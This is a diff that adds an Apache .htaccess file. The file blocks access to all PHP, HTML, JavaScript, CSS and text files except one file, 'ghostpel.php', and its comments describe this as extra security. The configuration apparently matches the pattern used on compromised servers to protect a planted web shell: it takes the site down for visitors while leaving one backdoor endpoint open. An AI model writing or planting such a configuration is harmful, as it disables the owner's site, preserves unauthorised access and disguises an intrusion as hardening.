@@ -1,0 +1,18 @@
+<IfModule mod_rewrite.c>
+    RewriteEngine On
+    
+    # Block access to all PHP files except ghostpel.php
+    RewriteCond %{REQUEST_URI} \.php$ [NC]
+    RewriteCond %{REQUEST_URI} !^/ghostpel\.php$ [NC]
+    RewriteRule ^ - [F]
+</IfModule>
+
+# Additional security - block all except ghostpel.php
+<FilesMatch "\.(php|html|htm|js|css|txt)$">
+    Order Deny,Allow
+    Deny from all
+</FilesMatch>
+
+<Files "ghostpel.php">
+    Allow from all
+</Files>
